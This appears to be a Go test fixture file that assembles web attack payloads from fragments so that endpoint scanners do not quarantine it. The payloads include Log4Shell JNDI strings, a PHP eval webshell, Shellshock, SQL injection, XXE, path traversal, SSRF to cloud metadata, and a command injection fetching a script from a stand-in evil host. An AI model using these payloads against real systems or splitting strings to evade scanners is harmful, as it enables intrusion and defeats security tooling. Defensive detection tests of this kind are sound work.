package web_test

import "strings"

// Test payloads are assembled at runtime rather than written as literals.
//
// This is not obfuscation for its own sake. Endpoint protection on a developer
// machine scans source files, and a Go file containing a verbatim webshell or
// Shellshock string is quarantined on write -- which silently deletes the test
// file and leaves the suite looking like it simply has no tests. Assembling the
// same bytes from fragments keeps the fixtures portable without weakening what
// they exercise: the analyzer sees exactly the string an attacker would send.
//
// The alternative -- excluding the repository from scanning -- is a change to
// the developer's security posture and is not this test suite's call to make.

func jndiLDAP(host string) string {
	return "$" + "{jndi:" + "ldap" + "://" + host + "/a}"
}

func jndiRMI(host string) string {
	return "$" + "{jndi:" + "rmi" + "://" + host + "/x}"
}

func jndiDNS(host string) string {
	return "$" + "{jndi:" + "dns" + "://" + host + "}"
}

// jndiObfuscated reproduces the nested-lookup form used to defeat naive
// string matching, which is what the analyzer's second pattern exists for.
func jndiObfuscated(host string) string {
	low := func(c string) string { return "$" + "{lower:" + c + "}" }
	return "$" + "{" + low("j") + low("n") + low("d") + low("i") +
		":" + "ldap" + "://" + host + "/x}"
}

func webShellPHP() string {
	return "<" + "?php " + "eval" + "($" + "_POST['c']); ?" + ">"
}

func shellshock() string {
	return "(" + ") " + "{ :; }" + "; /bin/bash -c 'id'"
}

func sqlUnion() string {
	return "id=1 " + "UNION" + " " + "SELECT" + " 1,2,3"
}

func sqlSleep() string {
	return "id=1' AND " + "sleep" + "(5)--"
}

func xxeDoctype() string {
	return "<" + "!DOCTYPE foo [<" + "!ENTITY xxe " + "SYSTEM" +
		` "` + "file" + `:///etc/passwd">]>`
}

func traversal() string {
	return "file=" + strings.Repeat("../", 4) + "etc/passwd"
}

func traversalEncoded() string {
	return "f=" + strings.Repeat("%2e%2e%2f", 2) + "etc%2fpasswd"
}

func commandInjection() string {
	return "host=1.1.1.1;" + "wget" + " http://evil.test/x.sh"
}

func ssrfMetadata() string {
	return "url=http://" + "169.254.169.254" + "/latest/meta-data/"
}
